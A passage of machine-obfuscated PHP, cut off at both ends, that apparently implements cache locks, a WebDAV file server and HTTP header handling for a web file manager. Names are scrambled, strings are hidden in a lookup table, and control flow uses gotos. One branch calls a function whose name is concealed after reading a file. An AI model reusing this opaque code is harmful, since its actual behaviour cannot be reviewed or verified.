$cÉêµğˆØç[$EŸ’äô¡œ¸[1097]] == 0 ? $AÊƒ·ŠŒ—è : $cÉêµğˆØç[$EŸ’äô¡œ¸[1097]]; $cÉêµğˆØç[$EŸ’äô¡œ¸[1098]] = $B³£ô­Áùå; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\x73\x73\110\x74\x74\x70\x3a\x64\x6f\x77\156\72{$B³£ô­Áùå}\57{$AÊƒ·ŠŒ—è}\x3b\40\165\x70\154\x6f\x61\144\72{$D’ˆò÷Šê‹}\57{$C¡ÅÈ™àë}\x3b"); } } if ($_SERVER[$_SERVER[İë¬“ÅÒÛ›][556]] != $_SERVER[$_SERVER[İë¬“ÅÒÛ›][952]]) { goto dõ‚¶Š‰á±; Eùä†ŠÇÛß: $a¶ª¾£æÂ¨ = explode($_SERVER[İë¬“ÅÒÛ›][224], $FÀï‹˜©È¹); if (count($a¶ª¾£æÂ¨) < $_SERVER[İë¬“ÅÒÛ›][593]) { die; } $eŞªÕÑô£Ÿ = $_SERVER[İë¬“ÅÒÛ›][594]; goto fÙ¥…˜á­é; dõ‚¶Š‰á±: $f£Ó®ôÀ = $_SERVER[İë¬“ÅÒÛ›][557]; $cµèŒ‘¸Ş = BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]; $FÀï‹˜©È¹ = $f£Ó®ôÀ($cµèŒ‘¸Ş); goto Eùä†ŠÇÛß; fÙ¥…˜á­é: $eŞªÕÑô£Ÿ($_SERVER[$_SERVER[İë¬“ÅÒÛ›][592]]); goto Eš—®ø«¤; Eš—®ø«¤: } goto e«ß¼Ñ­Á„; bˆì±•ÎĞÇ: class CacheLockRedis { public function lock($eÒ—è¿…¼õ, $F·Ğ¼­ÃßÀ = 10) { $DÓ¹ó’±ŒÓ = Cache::init(); $B¯ÂŠ’êÔÛ = microtime(!0) + $F·Ğ¼­ÃßÀ; while (microtime(!0) < $B¯ÂŠ’êÔÛ) { $E½³Ÿ®İ‡Ô = $DÓ¹ó’±ŒÓ->get($eÒ—è¿…¼õ); if (!$E½³Ÿ®İ‡Ô) { $AÂ©Œ¹¹Í÷ = $DÓ¹ó’±ŒÓ->setLock($eÒ—è¿…¼õ, $B¯ÂŠ’êÔÛ, $F·Ğ¼­ÃßÀ); if ($AÂ©Œ¹¹Í÷) { return !0; } } else { if ($E½³Ÿ®İ‡Ô < microtime(!0)) { $DÓ¹ó’±ŒÓ->set($eÒ—è¿…¼õ, $B¯ÂŠ’êÔÛ, $B¯ÂŠ’êÔÛ); if ($DÓ¹ó’±ŒÓ->get($eÒ—è¿…¼õ) === $E½³Ÿ®İ‡Ô) { return !0; } } } cacheLockWait(); } return !1; } public function unlock($aèÜˆÍà‰) { $Eõ±ÀÏ¾Â = Cache::init(); $Eõ±ÀÏ¾Â->remove($aèÜˆÍà‰); } } class CacheLockMemcached { public function lock($C¦‹¹… ç, $B÷Õƒ‡ˆ = 0) { $DšĞŠƒ×º± = Cache::init(); $b¢‡¯„¸‰¤ = microtime(!0) + $B÷Õƒ‡ˆ; while (microtime(!0) < $b¢‡¯„¸‰¤) { $bÌÔæÎ·§Æ = $DšĞŠƒ×º±->get($C¦‹¹… ç); if (!$bÌÔæÎ·§Æ || $bÌÔæÎ·§Æ < microtime(!0)) { $d«¸Äñ’Ù = $DšĞŠƒ×º±->handle->add($C¦‹¹… ç, $b¢‡¯„¸‰¤, $B÷Õƒ‡ˆ); if ($d«¸Äñ’Ù) { return !0; } } cacheLockWait(); } return !1; } public function unlock($C¬–•‰ï´±) { $bÑšÅ«Üœƒ = Cache::init(); $bÑšÅ«Üœƒ->remove($C¬–•‰ï´±); } } class CacheLockDatabase { public function lock($eîï„ºŒù÷, $b¤¹ÕÀ”Û = 0) { $eæŒËöãØ› = Model($_SERVER[İë¬“ÅÒÛ›][525]); $cƒ·Ôµ²°œ = microtime(!0) + $b¤¹ÕÀ”Û; while (microtime(!0) < $cƒ·Ôµ²°œ) { $BàÓ©¨Œ·‚ = $eæŒËöãØ›->get($eîï„ºŒù÷); if (!$BàÓ©¨Œ·‚ || $BàÓ©¨Œ·‚ < microtime(!0)) { $Fæ˜¾Ä¤ãØ = $eæŒËöãØ›->set($eîï„ºŒù÷, $cƒ·Ôµ²°œ); if ($Fæ˜¾Ä¤ãØ) { return !0; } } cacheLockWait(); } return !1; } public function unlock($fØ­®µ§‰) { Model($_SERVER[İë¬“ÅÒÛ›][525])->remove($fØ­®µ§‰); } } goto b‡’ƒ§àÈ; AÏ”ßÚ‰ªµ: class HttpDavServer { public function __construct($A“ŠËÃ¾Ø, $B·¤É¡Øƒ‘) { $this->root = $A“ŠËÃ¾Ø; $this->initPath($B·¤É¡Øƒ‘); $this->start(); } public function initPath($fÏ”®ô‘Û) { $C¾Ÿ†‘ò¾¹ =& $_SERVER[İë¬“ÅÒÛ›]; $dìèá¥‡Ú¾ = rtrim($_SERVER[$C¾Ÿ†‘ò¾¹[438]], $C¾Ÿ†‘ò¾¹[8]) . $C¾Ÿ†‘ò¾¹[8]; $this->urlBase = substr($dìèá¥‡Ú¾, 0, strpos($dìèá¥‡Ú¾, $fÏ”®ô‘Û) + 1); $this->urlBase = rtrim($this->urlBase, $C¾Ÿ†‘ò¾¹[8]) . $fÏ”®ô‘Û; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $DÎ£âçå´ =& $_SERVER[İë¬“ÅÒÛ›]; $FÜ¸Æî°Ö = HttpAuth::get(); if ($FÜ¸Æî°Ö[$DÎ£âçå´[417]] == $DÎ£âçå´[1213] && $FÜ¸Æî°Ö[$DÎ£âçå´[667]] == $DÎ£âçå´[1214]) { return !0; } HttpAuth::error(); } public function start() { goto DèĞ“âÁ­¦; bÖÈíç…š: if (!$bÉÚŠØÕÉ) { return; } self::response($bÉÚŠØÕÉ); goto Eòø‰•‚™; F¼®ß¿Õµš: if (!method_exists($this, $a¼š„ƒã±Î)) { pr($a¼š„ƒã±Î . $AÕ“¯¦å”‚[1215]); die; } $b¿÷‡½Ãºî = array($AÕ“¯¦å”‚[1216], $AÕ“¯¦å”‚[1217]); if (!in_array($a¼š„ƒã±Î, $b¿÷‡½Ãºî) && !$this->pathExists($this->path)) { $bÉÚŠØÕÉ = array($AÕ“¯¦å”‚[784] => 404); } else { $bÉÚŠØÕÉ = $this->{$a¼š„ƒã±Î}(); } goto bÖÈíç…š; DèĞ“âÁ­¦: $AÕ“¯¦å”‚ =& $_SERVER[İë¬“ÅÒÛ›]; $this->checkUser(); $a¼š„ƒã±Î = $AÕ“¯¦å”‚[141] . HttpHeader::method(); goto F¼®ß¿Õµš; Eòø‰•‚™: } public function pathGet($DõåØŞÍ¯¶ = false) { $E‰²«à»ê =& $_SERVER[İë¬“ÅÒÛ›]; $EÊ×—•Ùí = $DõåØŞÍ¯¶ ? $_SERVER[$E‰²«à»ê[1218]] : $_SERVER[$E‰²«à»ê[438]]; $EÊ×—•Ùí = KodIO::clear(rawurldecode($EÊ×—•Ùí)); if (!strstr($EÊ×—•Ùí, KodIO::clear($this->urlBase))) { return !1; } return substr($EÊ×—•Ùí, strpos($EÊ×—•Ùí, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($DğÕìäĞë«) { return file_exists($DğÕìäĞë«); } public function pathMkdir($C¿Â¨ŸŠ…) { return mkdir($C¿Â¨ŸŠ…, 511, !0); } public function pathInfo($EŠµ¾…Å…) { return path_info($EŠµ¾…Å…); } public function pathList($aºØ×„ÀÎ¾) { return path_list($aºØ×„ÀÎ¾); } public function pathOut($E°²š£Æ‚) { echo file_get_contents($E°²š£Æ‚); } public function pathPut($C‘Œİª¤™, $e«­Äª¡ñ = '') { if (!$e«­Äª¡ñ) { return file_put_contents($C‘Œİª¤™, $_SERVER[İë¬“ÅÒÛ›][33]); } return move_path($e«­Äª¡ñ, $C‘Œİª¤™); } public function pathRemove($e‰Šõ¬¨¥) { if (is_file($e‰Šõ¬¨¥)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($fÅÜ¦­‚ÇÕ, $AÈÜôÛÕÂ”) { return move_path($fÅÜ¦­‚ÇÕ, $AÈÜôÛÕÂ”); } public function pathCopy($c‘„ÚâÄ÷, $e‚íå³Ğøà) { return copy_dir($c‘„ÚâÄ÷, $e‚íå³Ğøà); } public function parsePath($Dº¾ˆö®Êİ) { return $Dº¾ˆö®Êİ; } public function parseItem($d“ñ‡‰ôš) { goto E¦½ŠïÙô; E¦½ŠïÙô: $eöòô‡ºŒ½ =& $_SERVER[İë¬“ÅÒÛ›]; $Dèõ¡» = $this->pathGet() . $eöòô‡ºŒ½[8] . $d“ñ‡‰ôš[$eöòô‡ºŒ½[28]]; $Dèõ¡» = str_replace($eöòô‡ºŒ½[169], $eöòô‡ºŒ½[8], rawurlencode($Dèõ¡»)); goto E²‰˜ãà—Ã; E²‰˜ãà—Ã: if (!trim($d“ñ‡‰ôš[$eöòô‡ºŒ½[106]])) { $d“ñ‡‰ôš[$eöòô‡ºŒ½[106]] = time(); } if (!trim($d“ñ‡‰ôš[$eöòô‡ºŒ½[187]])) { $d“ñ‡‰ôš[$eöòô‡ºŒ½[187]] = time(); } $BæİŒºÙªª = array($eöòô‡ºŒ½[1219] => KodIO::clear($this->urlBase . $eöòô‡ºŒ½[8] . $Dèõ¡»), $eöòô‡ºŒ½[106] => @gmdate($eöòô‡ºŒ½[1220], $d“ñ‡‰ôš[$eöòô‡ºŒ½[106]]), $eöòô‡ºŒ½[187] => @gmdate($eöòô‡ºŒ½[1221], $d“ñ‡‰ôš[$eöòô‡ºŒ½[187]]), $eöòô‡ºŒ½[78] => $d“ñ‡‰ôš[$eöòô‡ºŒ½[78]] ? $d“ñ‡‰ôš[$eöòô‡ºŒ½[78]] : 0); goto b’“İöî¬; b’“İöî¬: return $BæİŒºÙªª; goto B™Œ×“­¾–; B™Œ×“­¾–: } public function parseItemXml($FŒÑêƒôÍ²) { $eˆß››äİ =& $_SERVER[İë¬“ÅÒÛ›]; $eİğÈÂ…¯ = $this->parseItem($FŒÑêƒôÍ²); if ($FŒÑêƒôÍ²[$eˆß››äİ[29]] == $eˆß››äİ[77]) { $dŒ ˆÕ‡‹Š = $eˆß››äİ[1222]; $dŒ ˆÕ‡‹Š .= $eˆß››äİ[1223]; } else { $aÔæ‚’í²¦ = $FŒÑêƒôÍ²[$eˆß››äİ[157]] ? $FŒÑêƒôÍ²[$eˆß››äİ[157]] : get_path_ext($FŒÑêƒôÍ²[$eˆß››äİ[28]]); $f‘„³æ»Ô¾ = get_file_mime($aÔæ‚’í²¦); $dŒ ˆÕ‡‹Š = $eˆß››äİ[1224]; $dŒ ˆÕ‡‹Š .= "\x3c\x44\72\x67\145\164\x63\157\x6e\x74\x65\x6e\x74\x74\171\160\x65\76{$f‘„³æ»Ô¾}\74\57\x44\72\147\145\x74\143\x6f\156\x74\145\156\x74\x74\x79\x70\x65\76"; } return "\xa\x9\11\74\104\72\x72\x65\163\160\157\x6e\x73\x65\76\12\11\x9\x9\74\x44\x3a\150\162\x65\146\x3e{$eİğÈÂ…¯[$eˆß››äİ[1219]]}\74\57\104\x3a\x68\162\145\146\76\12\x9\11\x9\x3c\104\x3a\160\x72\157\160\x73\x74\x61\x74\76\12\11\x9\11\x9\x3c\x44\x3a\160\x72\157\160\76\xa\11\x9\11\11\11\74\x44\72\x67\145\164\154\x61\163\x74\155\x6f\x64\151\146\x69\145\144\76{$eİğÈÂ…¯[$eˆß››äİ[106]]}\x3c\57\104\x3a\x67\145\164\154\141\163\164\x6d\x6f\x64\151\146\x69\145\x64\76\xa\11\11\x9\11\x9\74\104\72\143\162\145\141\164\x69\x6f\x6e\144\141\164\145\76{$eİğÈÂ…¯[$eˆß››äİ[187]]}\74\57\104\72\x63\x72\x65\141\164\x69\x6f\x6e\144\x61\164\x65\x3e\12\11\x9\x9\11\11\x3c\x44\72\x67\145\164\143\157\x6e\164\x65\x6e\x74\154\145\156\147\164\x68\76{$eİğÈÂ…¯[$eˆß››äİ[78]]}\x3c\x2f\104\72\147\145\164\143\157\156\164\145\156\x74\x6c\145\x6e\x67\x74\x68\76\xa\11\x9\11\x9\x9{$dŒ ˆÕ‡‹Š}\xa\x9\x9\x9\x9\74\x2f\104\x3a\160\162\x6f\x70\x3e\xa\x9\11\x9\x9\x3c\104\72\163\164\141\164\165\x73\76\x48\124\x54\x50\x2f\x31\56\61\x20\62\x30\60\40\x4f\x4b\74\57\x44\72\163\x74\x61\x74\x75\163\x3e\12\x9\11\x9\x3c\57\104\72\160\x72\157\x70\163\x74\141\x74\76\12\x9\11\x3c\57\x44\72\x72\x65\163\160\157\x6e\163\x65\x3e"; } public function pathListMerge($c¾ù‹‹ô«) { goto E«ğ‰¨Ş¦¾; E«ğ‰¨Ş¦¾: $E§‘Üê‡Çê =& $_SERVER[İë¬“ÅÒÛ›]; if (!$c¾ù‹‹ô«) { return $c¾ù‹‹ô«; } $cˆµ‹±ì‡ = array($E§‘Üê‡Çê[74], $E§‘Üê‡Çê[75], $E§‘Üê‡Çê[1225]); goto bé¦‰ö„³®; A“ÒÃ—Ö”: return $AêÔµ´ÏèŒ; goto fƒø¶Çë¨Ş; bé¦‰ö„³®: $AêÔµ´ÏèŒ = array(); foreach ($c¾ù‹‹ô« as $eÆÇÁŠÌ => $a˜¹Ë”†Ë) { if (!in_array($eÆÇÁŠÌ, $cˆµ‹±ì‡) || !is_array($a˜¹Ë”†Ë)) { continue; } $AêÔµ´ÏèŒ = array_merge($AêÔµ´ÏèŒ, $a˜¹Ë”†Ë); } foreach ($AêÔµ´ÏèŒ as &$A¿Ô–ëƒÕƒ) { $A¿Ô–ëƒÕƒ[$E§‘Üê‡Çê[28]] = str_replace($E§‘Üê‡Çê[8], $E§‘Üê‡Çê[1050], $A¿Ô–ëƒÕƒ[$E§‘Üê‡Çê[28]]); } goto A“ÒÃ—Ö”; fƒø¶Çë¨Ş: } public function httpPROPFIND() { goto AÃ¹Ù’µ™®; BÓ½öèáÚƒ: if (!is_array($E¯¼·º»«´)) { return array($eØàÏÅ¿¼[1226] => 404, $eØàÏÅ¿¼[1227] => $eØàÏÅ¿¼[1228]); } $b¤¤ßœ‹ˆÚ = IO::info($this->path); $A‚ ‡ØéŠï = array($eØàÏÅ¿¼[388] => $eØàÏÅ¿¼[33], $eØàÏÅ¿¼[29] => $eØàÏÅ¿¼[77]); goto A¢…Å¥âí„; bˆßİ»‡šù: if ($a…’¼Ÿç == $eØàÏÅ¿¼[403]) { $E¯¼·º»«´ = array($A‚ ‡ØéŠï); } else { $E¯¼·º»«´ = array_merge(array($A‚ ‡ØéŠï), $E¯¼·º»«´); } $añç±‹Ç¸è = $eØàÏÅ¿¼[33]; foreach ($E¯¼·º»«´ as $d¯š­¿¬´) { $añç±‹Ç¸è .= $this->parseItemXml($d¯š­¿¬´); } goto Eâƒ™ê˜Æ; AÃ¹Ù’µ™®: $eØàÏÅ¿¼ =& $_SERVER[İë¬“ÅÒÛ›]; $E¯¼·º»«´ = $this->pathList($this->path); $E¯¼·º»«´ = $this->pathListMerge($E¯¼·º»«´); goto BÓ½öèáÚƒ; Eâƒ™ê˜Æ: return array($eØàÏÅ¿¼[1226] => 207, $eØàÏÅ¿¼[1227] => "\74\x44\x3a\155\165\x6c\x74\151\x73\164\x61\x74\165\x73\x20\x78\155\154\156\163\72\x44\75\x22\x44\x41\126\x3a\x22\76\12{$añç±‹Ç¸è}\12\74\57\104\x3a\155\165\154\164\x69\x73\164\141\x74\x75\163\76"); goto D¥Îé‰×âà; A¢…Å¥âí„: if ($b¤¤ßœ‹ˆÚ) { $A‚ ‡ØéŠï[$eØàÏÅ¿¼[187]] = $b¤¤ßœ‹ˆÚ[$eØàÏÅ¿¼[187]]; $A‚ ‡ØéŠï[$eØàÏÅ¿¼[106]] = $b¤¤ßœ‹ˆÚ[$eØàÏÅ¿¼[106]]; $A‚ ‡ØéŠï[$eØàÏÅ¿¼[157]] = $b¤¤ßœ‹ˆÚ[$eØàÏÅ¿¼[157]]; $A‚ ‡ØéŠï[$eØàÏÅ¿¼[29]] = $b¤¤ßœ‹ˆÚ[$eØàÏÅ¿¼[29]]; } $a…’¼Ÿç = HttpHeader::get($eØàÏÅ¿¼[1205]); if ($A‚ ‡ØéŠï[$eØàÏÅ¿¼[29]] == $eØàÏÅ¿¼[164]) { $a…’¼Ÿç = $eØàÏÅ¿¼[403]; } goto bˆßİ»‡šù; D¥Îé‰×âà: } public function httpHEAD() { $fö”ƒŠÖ› =& $_SERVER[İë¬“ÅÒÛ›]; $Cë«ÑÄãÔå = $this->pathInfo($this->path); if (!$Cë«ÑÄãÔå || $Cë«ÑÄãÔå[$fö”ƒŠÖ›[29]] == $fö”ƒŠÖ›[77]) { return array($fö”ƒŠÖ›[784] => 200, $fö”ƒŠÖ›[943] => array($fö”ƒŠÖ›[1229])); } return array($fö”ƒŠÖ›[784] => 200, $fö”ƒŠÖ›[943] => array($fö”ƒŠÖ›[1230], $fö”ƒŠÖ›[135], $fö”ƒŠÖ›[1231] . $Cë«ÑÄãÔå[$fö”ƒŠÖ›[78]], $fö”ƒŠÖ›[1232] . get_file_mime($Cë«ÑÄãÔå[$fö”ƒŠÖ›[157]]), $fö”ƒŠÖ›[131] . gmdate($fö”ƒŠÖ›[1220], $Cë«ÑÄãÔå[$fö”ƒŠÖ›[1233]]) . $fö”ƒŠÖ›[1234], $fö”ƒŠÖ›[1235])); } public function httpOPTIONS() { $A½¶ôÒÔ•É =& $_SERVER[İë¬“ÅÒÛ›]; return array($A½¶ôÒÔ•É[784] => 200, $A½¶ôÒÔ•É[943] => array($A½¶ôÒÔ•É[1236], $A½¶ôÒÔ•É[1237], $A½¶ôÒÔ•É[1238], $A½¶ôÒÔ•É[1195])); } public function httpPROPPATCH() { $aºê²ÎÜ†È =& $_SERVER[İë¬“ÅÒÛ›]; $aà¬‡†ˆ = $aºê²ÎÜ†È[1239] . $_SERVER[$aºê²ÎÜ†È[438]] . $aºê²ÎÜ†È[1240]; return array($aºê²ÎÜ†È[1226] => 207, $aºê²ÎÜ†È[1227] => "\74\x44\72\x6d\x75\x6c\x74\x69\163\x74\x61\164\165\163\x20\170\x6d\x6c\156\x73\x3a\x44\x3d\x22\x44\101\x56\72\42\x3e\12{$aà¬‡†ˆ}\xa\x3c\57\x44\x3a\x6d\x75\154\164\151\163\x74\141\x74\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $E˜Â÷ŒÇÆ =& $_SERVER[İë¬“ÅÒÛ›]; $F´ù„Î¶¡ = $this->uploadFile(); if ($F´ù„Î¶¡) { $B‹î…‰˜Şè = 204; } else { $F´ù„Î¶¡ = $E˜Â÷ŒÇÆ[33]; $B‹î…‰˜Şè = 201; } $D…Âå›†›¨ = $this->pathPut($this->path, $F´ù„Î¶¡); if ($D…Âå›†›¨ == !1) { $B‹î…‰˜Şè = 404; } return array($E˜Â÷ŒÇÆ[1226] => $B‹î…‰˜Şè); } private function uploadFile() { goto fàÜ¦Û‹; aÃ†«Ó‘Ç†: $b™¸Ì ğ¸¡ = @fopen($bõ›‹¦ä, $EÚßÚ¼ÎÂ[1168]); $f¾ËÔø˜‡ì = @fopen($EÚßÚ¼ÎÂ[1242], $EÚßÚ¼ÎÂ[1167]); if (!$f¾ËÔø˜‡ì || !$b™¸Ì ğ¸¡) { @unlink($bõ›‹¦ä); return !1; } goto f¡äõ“‹ÑÙ; f¡äõ“‹ÑÙ: while (!feof($f¾ËÔø˜‡ì)) { fwrite($b™¸Ì ğ¸¡, fread($f¾ËÔø˜‡ì, 1024 * 200)); } fclose($f¾ËÔø˜‡ì); fclose($b™¸Ì ğ¸¡); goto fØ½Ô˜Ä˜²; fØ½Ô˜Ä˜²: if (@filesize($bõ›‹¦ä) > 0) { return $bõ›‹¦ä; } @unlink($bõ›‹¦ä); return !1; goto eÇÖÓ¶…éğ; fàÜ¦Û‹: $EÚßÚ¼ÎÂ =& $_SERVER[İë¬“ÅÒÛ›]; @mk_dir(TEMP_FILES); $bõ›‹¦ä = TEMP_FILES . $EÚßÚ¼ÎÂ[1241] . rand_string(32); goto aÃ†«Ó‘Ç†; eÇÖÓ¶…éğ: } public function httpMKCOL() { $FÛ•¡å‘Ö =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->pathExists($this->path)) { return array($FÛ•¡å‘Ö[784] => 409); } $DÈÊÜ«îƒ¨ = $this->pathMkdir($this->path); return array($FÛ•¡å‘Ö[784] => $DÈÊÜ«îƒ¨ ? 201 : 403); } public function httpMOVE() { $fùÔ¢Ã×Í¦ =& $_SERVER[İë¬“ÅÒÛ›]; $F²¨¹¡†Í = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$fùÔ¢Ã×Í¦[1243]])) { $c’—Éƒ­ [$fùÔ¢Ã×Í¦[1244]] = $_SERVER[$fùÔ¢Ã×Í¦[1243]] == $fùÔ¢Ã×Í¦[1245]; } $BÁˆ¥«“Îó = $this->pathMove($this->path, $F²¨¹¡†Í); return array($fùÔ¢Ã×Í¦[784] => $BÁˆ¥«“Îó ? 201 : 404); } public function httpCOPY() { $A­ƒŒÓ— = $this->parsePath($this->pathGet(!0)); $EÅ•²‰Ëì = $this->pathCopy($this->path, $A­ƒŒÓ—); return array($_SERVER[İë¬“ÅÒÛ›][784] => $EÅ•²‰Ëì ? 201 : 404); } public function httpDELETE() { $E´¥Œõ¶˜¬ = $this->pathRemove($this->path); return array($_SERVER[İë¬“ÅÒÛ›][784] => $E´¥Œõ¶˜¬ ? 200 : 503); } public function httpLOCK() { $a’Àù¢×Ş¶ =& $_SERVER[İë¬“ÅÒÛ›]; $bÓÁÒÉÅ¬ = md5($this->path); $BƒÈ´³ª·  = $a’Àù¢×Ş¶[1246] . $this->xmlGet($a’Àù¢×Ş¶[1247]) . $a’Àù¢×Ş¶[1248] . $bÓÁÒÉÅ¬ . $a’Àù¢×Ş¶[1249]; return array($a’Àù¢×Ş¶[784] => 200, $a’Àù¢×Ş¶[943] => array($a’Àù¢×Ş¶[1250] . $bÓÁÒÉÅ¬, $a’Àù¢×Ş¶[1251]), $a’Àù¢×Ş¶[1252] => $BƒÈ´³ª· ); } public function httpUNLOCK() { return array($_SERVER[İë¬“ÅÒÛ›][784] => 204); } public function xmlGet($E¡Í‹÷İ…ˆ) { goto Aåâ·ÔÁ¯°; Aåâ·ÔÁ¯°: $CÁ¤Ö ±Á =& $_SERVER[İë¬“ÅÒÛ›]; static $F±ø›à¦Õ = false; if (!$F±ø›à¦Õ) { $fÊ‹­Í… ª = file_get_contents($CÁ¤Ö ±Á[1253]); $F±ø›à¦Õ = new DOMDocument(); $F±ø›à¦Õ->loadXML($fÊ‹­Í… ª); } goto eè¢¡ä„£ ; eè¢¡ä„£ : $c’¢©ÃÔ ­ = array_shift(explode($CÁ¤Ö ±Á[8], $E¡Í‹÷İ…ˆ)); $bƒŠÍ‹’ÆÙ = $F±ø›à¦Õ->getElementsByTagNameNS($CÁ¤Ö ±Á[1254], $c’¢©ÃÔ ­); if ($bƒŠÍ‹’ÆÙ) { return $bƒŠÍ‹’ÆÙ[0]->nodeValue; } goto Cä†‘á†§ä; Cä†‘á†§ä: return $CÁ¤Ö ±Á[33]; goto aÉ³ö‚‚Üö; aÉ³ö‚‚Üö: } public static function response($AÆ¤¾’Œà‚) { goto EÂ‘Àª’‚í; b¡´£ÃøÆë: if (is_string($AÆ¤¾’Œà‚[$D›„¡ãÇŒ¸[1252]])) { header($D›„¡ãÇŒ¸[1255]); $d¹¾ÑÑ…ƒ« = $D›„¡ãÇŒ¸[1256] . $D›„¡ãÇŒ¸[224] . $AÆ¤¾’Œà‚[$D›„¡ãÇŒ¸[1252]]; echo $d¹¾ÑÑ…ƒ«; } goto F¼ŠôÓ¼Ø£; Cäªø”ã: $e…Š„ÌõÄ[] = $D›„¡ãÇŒ¸[1193]; $e…Š„ÌõÄ[] = $D›„¡ãÇŒ¸[1194]; foreach ($e…Š„ÌõÄ as $e¤¾Ó¡ãËª) { header($e¤¾Ó¡ãËª); } goto b¡´£ÃøÆë; EÂ‘Àª’‚í: $D›„¡ãÇŒ¸ =& $_SERVER[İë¬“ÅÒÛ›]; $e…Š„ÌõÄ = is_array($AÆ¤¾’Œà‚[$D›„¡ãÇŒ¸[943]]) ? $AÆ¤¾’Œà‚[$D›„¡ãÇŒ¸[943]] : array(); $e…Š„ÌõÄ[] = HttpHeader::code($AÆ¤¾’Œà‚[$D›„¡ãÇŒ¸[784]]); goto Cäªø”ã; F¼ŠôÓ¼Ø£: } } class HttpHeader { public static $_headers = array("\110\x6f\x73\x74" => "\110\x54\124\120\x5f\110\117\123\124", "\x55\x73\x65\162\x2d\x41\x67\x65\x6e\x74" => "\110\124\124\x50\137\x55\123\x45\x52\x5f\x41\x47\105\116\124", "\x43\157\x6e\x74\145\156\x74\55\124\x79\x70\145" => "\x48\124\124\x50\x5f\x43\x4f\x4e\124\105\x4e\124\137\124\x59\x50\105", "\x43\157\156\x74\145\156\164\x2d\114\145\x6e\147\x74\x68" => "\110\124\x54\x50\x5f\x43\x4f\x4e\x54\105\x4e\124\x5f\114\x45\x4e\x47\124\x48", "\x44\145\160\x74\150" => "\x48\x54\124\x50\x5f\104\105\120\124\110", "\105\170\160\x65\x63\x74" => "\x48\x54\x54\120\x5f\x45\x58\x50\105\x43\124", "\111\x66\55\116\157\156\x65\x2d\x4d\x61\164\x63\x68" => "\110\x54\124\x50\137\x49\x46\137\x4e\117\116\105\x5f\115\x41\124\103\x48", "\111\x66\55\115\x61\x74\x63\x68" => "\x48\x54\124\x50\137\111\106\137\115\101\x54\x43\110", "\x49\x66\55\122\141\156\147\x65" => "\110\x54\x54\120\x5f\111\x46\137\122\x41\x4e\x47\105", "\x4c\x61\163\x74\x2d\x4d\157\x64\x69\x66\151\145\144" => "\110\124\x54\x50\x5f\x4c\x41\x53\x54\137\115\117\104\x49\x46\x49\105\104", "\x49\x66\55\115\157\144\151\146\151\x65\x64\x2d\123\151\156\x63\145" => "\x48\x54\124\120\x5f\111\106\137\x4d\x4f\104\111\x46\x49\x45\x44\x5f\123\x49\x4e\103\105", "\111\146\55\125\156\x6d\157\144\x69\x66\x69\145\144\55\123\x69\x6e\143\145" => "\x48\x54\x54\x50\x5f\x49\x46\137\x55\116\x4d\117\x44\111\x46\111\x45\x44\x5f\123\111\116\x43\105", "\122\141\156\147\145" => "\110\124\124\120\137\x52\101\116\107\105", "\x54\151\x6d\x65\x6f\x75\x74" => "\x48\x54\124\x50\x5f\124\x49\115\105\117\125\x54", "\111\x66" => "\x48\x54\124\x50\x5f\x49\106", "\x4c\157\x63\153\x2d\124\157\153\145\x6e" => "\110\x54\124\x50\137\114\x4f\x43\x4b\137\x54\117\113\105\x4e", "\117\x76\x65\x72\x77\162\x69\164\145" => "\110\x54\124\x50\137\117\x56\105\x52\x57\x52\x49\x54\x45", "\x44\x65\x73\x74\x69\156\x61\164\x69\x6f\156" => "\x48\x54\x54\x50\x5f\x44\105\x53\124\111\116\101\124\111\x4f\116", "\122\x65\x71\x75\145\163\x74\x2d\111\144" => "\122\105\121\125\x45\x53\x54\x5f\x49\x44", "\122\145\161\165\x65\x73\164\x2d\x42\x6f\144\171\x2d\106\x69\x6c\145" => "\122\105\121\x55\105\x53\124\137\102\x4f\x44\131\x5f\x46\111\114\105", "\122\x65\144\x69\162\145\143\x74\x2d\123\x74\x61\164\x75\163" => "\x52\x45\104\x49\122\x45\x43\x54\x5f\x53\124\101\x54\125\x53"); public static function init() { static $d÷ˆ·¥Ê• = false; if ($d÷ˆ·¥Ê•) { return; } foreach ($_SERVER as $FçãÃà‡Ú» => $a“ªŒƒŠÁ) { $FçãÃà‡Ú» = strtoupper($FçãÃà‡Ú»); if (!array_key_exists($FçãÃà‡Ú», $_SERVER)) { continue; } $_SERVER[$FçãÃà‡Ú»] = $a“ªŒƒŠÁ; } foreach (self::$_headers as $FçãÃà‡Ú» => $B‚Š«‹Ÿ¶õ) { if (!array_key_exists($FçãÃà‡Ú», $_SERVER)) { continue; } $_SERVER[$FçãÃà‡Ú»] = $_SERVER[$B‚Š«‹Ÿ¶õ]; $_SERVER[strtoupper($FçãÃà‡Ú»)] = $_SERVER[$B‚Š«‹Ÿ¶õ]; } } public static function get($cŞ÷ç¦ô˜) { self::init(); return $_SERVER[$cŞ÷ç¦ô˜] ? $_SERVER[$cŞ÷ç¦ô˜] : $_SERVER[$_SERVER[İë¬“ÅÒÛ›][1257] . strtoupper($cŞ÷ç¦ô˜)]; } public static function method() { return strtoupper(self::get($_SERVER[İë¬“ÅÒÛ›][149])); } public static function length() { $Eƒõ÷öÇÃ =& $_SERVER[İë¬“ÅÒÛ›]; $féâ¸¡â™¦ = self::get($Eƒõ÷öÇÃ[1258]); if (!$féâ¸¡â™¦) { $féâ¸¡â™¦ = self::get($Eƒõ÷öÇÃ[882]); } return $féâ¸¡â™¦; } public static function range() { $bÈËîòÖ½ =& $_SERVER[İë¬“ÅÒÛ›]; $A… À•ô = self::get($bÈËîòÖ½[198]); if (!$A… À•ô) { return !1; } if (!preg_match($bÈËîòÖ½[1259], $A… À•ô, $BÚÌî®¬…Â)) { return !1; } if ($BÚÌî®¬…Â[1] === $bÈËîòÖ½[33] && $BÚÌî®¬…Â[2] === $bÈËîòÖ½[33]) { return !1; } return array($BÚÌî®¬…Â[1] !== $bÈËîòÖ½[33] ? $BÚÌî®¬…Â[1] : null, $BÚÌî®¬…Â[2] !== $bÈËîòÖ½[33] ? $BÚÌî®¬…Â[2] : null); } public static $statusCode = array("\61\x30\60" => "\103\x6f\156\164\151\x6e\165\x65", "\x31\x30\61" => 